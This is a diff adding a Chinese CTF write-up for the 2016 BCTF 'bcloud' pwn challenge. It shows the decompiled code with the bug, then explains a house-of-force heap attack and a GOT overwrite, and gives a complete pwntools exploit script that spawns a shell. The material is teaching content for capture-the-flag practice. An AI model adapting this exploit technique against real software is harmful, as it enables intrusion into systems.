@@ -356,5 +356,192 @@ r.interactive()
 
 当然，这一题也可以使用 unlink 的方法来做。
 
+## 2016 BCTF bcloud
+
+### 基本信息
+
+```shell
+➜  2016_bctf_bcloud git:(master) file bcloud   
+bcloud: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=96a3843007b1e982e7fa82fbd2e1f2cc598ee04e, stripped
+➜  2016_bctf_bcloud git:(master) checksec bcloud  
+[*] '/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/heap/example/house_of_force/2016_bctf_bcloud/bcloud'
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x8048000)
+```
+
+可以看出，这是一个动态链接的 32 位程序，主要开启了 Canary 保护与 NX 保护。
+
+### 基本功能
+
+程序大概是一个云笔记管理系统。首先，程序会进行一些初始化，设置用户的名字，组织，host。程序主要有以下几个功能
+
+1. 新建note，根据用户的输入x申请x+4的空间作为note的大小。
+2. 展示note，啥功能也没有。。
+3. 编辑note，根据用户指定的 note 编辑对应的内容。
+4. 删除note，删除对应note。
+5. 同步note，标记所有的note已经被同步。
+
+然而在这五个功能中并没有发现啥漏洞，，，重新看程序，结果发现程序在初始化的时候出现了漏洞。。
+
+初始化名字
+
+```c
+unsigned int init_name()
+{
+  char s; // [esp+1Ch] [ebp-5Ch]
+  char *tmp; // [esp+5Ch] [ebp-1Ch]
+  unsigned int v3; // [esp+6Ch] [ebp-Ch]
+
+  v3 = __readgsdword(0x14u);
+  memset(&s, 0, 0x50u);
+  puts("Input your name:");
+  read_str(&s, 64, '\n');
+  tmp = (char *)malloc(0x40u);
+  name = tmp;
+  strcpy(tmp, &s);
+  info(tmp);
+  return __readgsdword(0x14u) ^ v3;
+}
+```
+
+这里如果程序读入的名字为64个字符，那么当程序在使用info函数输出对应的字符串时，就会输出对应的tmp指针内容，也就是说**泄露了堆的地址**。。
+
+初始化组织和org的时候存在漏洞
+
+```c
+unsigned int init_org_host()
+{
+  char s; // [esp+1Ch] [ebp-9Ch]
+  char *v2; // [esp+5Ch] [ebp-5Ch]
+  char v3; // [esp+60h] [ebp-58h]
+  char *v4; // [esp+A4h] [ebp-14h]
+  unsigned int v5; // [esp+ACh] [ebp-Ch]
+
+  v5 = __readgsdword(0x14u);
+  memset(&s, 0, 0x90u);
+  puts("Org:");
+  read_str(&s, 64, 10);
+  puts("Host:");
+  read_str(&v3, 64, 10);
+  v4 = (char *)malloc(0x40u);
+  v2 = (char *)malloc(0x40u);
+  org = v2;
+  host = v4;
+  strcpy(v4, &v3);
+  strcpy(v2, &s);
+  puts("OKay! Enjoy:)");
+  return __readgsdword(0x14u) ^ v5;
+}
+```
+
+当读入组织时，给定 64 字节，会覆盖 v2 的低地址。与此同时，我们可以知道 v2 是与 top chunk 相邻的 chunk，而 v2 恰好与 org 相邻，那么由于在 32 位程序中，一般都是 32 位全部都使用，这里 v2 所存储的内容，几乎很大程度上都不是 `\x00` ，所以当执行 strcpy 函数向 v2 中拷贝内容时，很有可能会覆盖top chunk。这就是漏洞所在。
+
+### 利用
+
+1. 利用初始化名字处的漏洞泄漏堆的基地址。。
+2. 利用 house of force 将 top chunk 分配至全局的 0x0804B0A0 的 &notesize-8 处，当再次申请内存时，便返回notesize地址处的内存，从而我们就可以控制所有note的大小以及对应的地址了。
+3. 修改前三个 note 的大小为16，并修改其指针为 free@got，atoi@got，atoi@got
+4. 将 free@got 修改为 puts@plt。
+5. 泄漏 atoi 地址。
+6. 再次修改另外一个 atoi got 项为 system 地址，从而拿到shell。
+
+具体脚本如下
+
+```python
+from pwn import *
+context.terminal = ['gnome-terminal', '-x', 'sh', '-c']
+if args['DEBUG']:
+    context.log_level = 'debug'
+context.binary = "./bcloud"
+bcloud = ELF("./bcloud")
+if args['REMOTE']:
+    p = remote('127.0.0.1', 7777)
+else:
+    p = process("./bcloud")
+log.info('PID: ' + str(proc.pidof(p)[0]))
+libc = ELF('./libc.so.6')
+
+
+def offset_bin_main_arena(idx):
+    word_bytes = context.word_size / 8
+    offset = 4  # lock
+    offset += 4  # flags
+    offset += word_bytes * 10  # offset fastbin
+    offset += word_bytes * 2  # top,last_remainder
+    offset += idx * 2 * word_bytes  # idx
+    offset -= word_bytes * 2  # bin overlap
+    return offset
+
+
+def exp():
+    # leak heap base
+    p.sendafter('Input your name:\n', 'a' * 64)
+    p.recvuntil('Hey ' + 'a' * 64)
+    # sub name's chunk' s header
+    heap_base = u32(p.recv(4)) - 8
+    log.success('heap_base: ' + hex(heap_base))
+    p.sendafter('Org:\n', 'a' * 64)
+    p.sendlineafter('Host:\n', p32(0xffffffff))
+    # name,org,host, for each is (0x40+8)
+    topchunk_addr = heap_base + (0x40 + 8) * 3
+
+    # make topchunk point to 0x0804B0A0-8
+    p.sendlineafter('option--->>', '1')
+    notesize_addr = 0x0804B0A0
+    notelist_addr = 0x0804B120
+    targetaddr = notesize_addr - 8
+    offset_target_top = targetaddr - topchunk_addr
+    # 4 for size_t, 7 for malloc_allign
+    malloc_size = offset_target_top - 4 - 7
+    # plus 4 because malloc(v2 + 4);
+    p.sendlineafter('Input the length of the note content:\n',
+                    str(malloc_size - 4))
+    # most likely malloc_size-4<0...
+    if malloc_size - 4 > 0:
+        p.sendlineafter('Input the content:\n', '')
+
+    #gdb.attach(p)
+    # set notesize[0] = notesize[1] = notesize[2]=16
+    # set notelist[0] = free@got, notelist[1]= notelist[2]=atoi@got
+    p.sendlineafter('option--->>', '1')
+    p.sendlineafter('Input the length of the note content:\n', str(1000))
+
+    payload = p32(16) * 3 + (notelist_addr - notesize_addr - 12) * 'a' + p32(
+        bcloud.got['free']) + p32(bcloud.got['atoi']) * 2
+    p.sendlineafter('Input the content:\n', payload)
+
+    # overwrite free@got with puts@plt
+    p.sendlineafter('option--->>', '3')
+    p.sendlineafter('Input the id:\n', str(0))
+    p.sendlineafter('Input the new content:\n', p32(bcloud.plt['puts']))
+
+    # leak atoi addr by fake free
+    p.sendlineafter('option--->>', '4')
+    p.sendlineafter('Input the id:\n', str(1))
+    atoi_addr = u32(p.recv(4))
+    libc_base = atoi_addr - libc.symbols['atoi']
+    system_addr = libc_base + libc.symbols['system']
+    log.success('libc base addr: ' + hex(libc_base))
+
+    # overwrite atoi@got with system
+    p.sendlineafter('option--->>', '3')
+    p.sendlineafter('Input the id:\n', str(2))
+    p.sendlineafter('Input the new content:\n', p32(system_addr))
+
+    # get shell
+    p.sendlineafter('option--->>', '/bin/sh\x00')
+    p.interactive()
+
+
+if __name__ == "__main__":
+    exp()
+```
+
+
+
 ## 题目
 
+- [2016 Boston Key Party CTF cookbook](https://github.com/ctfs/write-ups-2016/tree/master/boston-key-party-2016/pwn/cookbook-6)
